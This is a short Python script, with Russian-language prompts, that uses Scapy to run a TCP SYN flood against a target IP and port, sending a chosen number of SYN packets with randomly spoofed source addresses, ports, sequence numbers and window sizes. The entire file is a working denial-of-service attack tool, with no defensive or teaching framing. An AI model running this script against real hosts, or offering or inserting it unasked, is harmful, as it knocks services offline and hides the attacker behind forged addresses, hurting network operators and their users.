from scapy.all import *
from random import randint
from scapy.layers.inet import IP, TCP


def get_random_IP():
    return ".".join(map(str, (randint(0, 255) for _ in range(4))))


def get_random_int():
    return randint(1000, 9000)


def syn_flood(ip_dst, dport, amnt):
    packet_deserved = 0
    print("\nНачало отправки...")

    for packet in range(0, amnt):
        s_port, s_eq, w_indow = get_random_int(), get_random_int(), get_random_int()

        IP_Packet = IP()
        IP_Packet.src, IP_Packet.dst = get_random_IP(), ip_dst

        TCP_Packet = TCP()
        TCP_Packet.sport, TCP_Packet.dport = s_port, dport
        TCP_Packet.flags = "S"
        TCP_Packet.seq, TCP_Packet.window = s_eq, w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        packet_deserved += 1

    print('\nВсего пакетов отправлено', packet_deserved)


if __name__ == '__main__':                            # example
    ip_target = input('\nIP цели         : ')         # start sniffing with {IP}, and then start flooding this {IP}
    port_target = int(input('Порт цели       : '))
    packet_amount = int(input('Кол-во пакетов  : '))

    syn_flood(ip_target, port_target, packet_amount)
